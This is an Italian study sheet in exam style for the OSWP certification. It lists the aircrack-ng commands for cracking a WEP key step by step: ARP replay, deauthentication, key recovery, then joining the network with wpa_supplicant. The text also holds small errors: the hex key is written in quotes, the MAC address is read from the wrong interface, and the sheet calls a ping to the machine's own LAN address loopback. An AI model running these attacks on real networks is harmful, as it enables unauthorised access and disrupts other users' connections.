
# 🛡️ OSWP – Attacco WEP (SSH-only, exam-style)

## ⚙️ 0. Setup iniziale

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Attiva monitor mode su `wlan0mon`.

---

## 🔍 1. Scansione reti

```bash
sudo airodump-ng wlan0mon
```

Identifica:
- `BSSID`
- `Channel`
- `Client associati` (STATION)

---

## 🎯 2. Sniff target

```bash
sudo airodump-ng --bssid <BSSID> -c <CH> -w dump wlan0mon
```

Raccoglie IV per crack.

---

## 🚀 3. Attacco ARP replay

```bash
sudo aireplay-ng --arpreplay -b <BSSID> -h <MAC_TUO> wlan0mon
```

Genera pacchetti per aumentare i `#Data`.

📌 Trova il MAC della tua scheda (prima di monitor mode):

```bash
cat /sys/class/net/wlan0mon/address
```

---

## 💣 4. (Opzionale) Attacco Deauth

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

Stimola il client a reinviare traffico.

---

## 🔓 5. Crack della chiave

```bash
aircrack-ng dump-01.cap
```

Risultato atteso:

```
KEY FOUND! [ 12:34:56:78:90 ]
```

---

## 🔌 6. Connessione con wpa_supplicant

### wep.conf

```ini
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0="1234567890"
    wep_tx_keyidx=0
}
```

### Avvio

```bash
sudo airmon-ng stop wlan0mon
sudo wpa_supplicant -i wlan0 -c wep.conf -D nl80211 -B
sudo dhclient wlan0
```

---

## ✅ 7. Verifica connessione

```bash
ip a
ping 192.168.1.1
```

---

## 🧠 Approfondimento: IP e Gateway

- L'indirizzo **192.168.1.48** è il tuo IP locale, assegnato dal router via DHCP.
- L'indirizzo **192.168.1.1** è quasi sempre il **gateway**, cioè il router stesso.
  È il dispositivo che ti connette al resto della rete o a Internet.
- Pingare `192.168.1.1` serve a verificare la connettività col gateway.
- Pingare `192.168.1.48` significa pingare te stesso (loopback locale, utile per test interni).

---

Fine del capitolo WEP. Pronto per la WPA2? 😎
